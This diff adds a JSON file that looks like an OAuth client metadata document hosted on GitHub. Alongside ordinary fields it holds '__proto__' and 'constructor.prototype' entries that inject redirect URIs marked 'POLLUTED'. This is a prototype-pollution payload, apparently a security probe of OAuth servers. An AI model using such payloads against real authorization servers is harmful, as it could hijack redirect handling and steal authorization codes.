@@ -1,0 +1,26 @@
+{
+ "client_id": "https://raw.githubusercontent.com/Mwathimaina/Mwathimaina/main/oauth-client-pp.json",
+ "client_name": "pp",
+ "redirect_uris": [
+  "https://raw.githubusercontent.com/Mwathimaina/Mwathimaina/main/oauth-client-pp.json"
+ ],
+ "grant_types": [
+  "authorization_code"
+ ],
+ "response_types": [
+  "code"
+ ],
+ "token_endpoint_auth_method": "none",
+ "__proto__": {
+  "redirect_uris": [
+   "https://example.com/POLLUTED"
+  ]
+ },
+ "constructor": {
+  "prototype": {
+   "redirect_uris": [
+    "https://example.com/POLLUTED2"
+   ]
+  }
+ }
+}
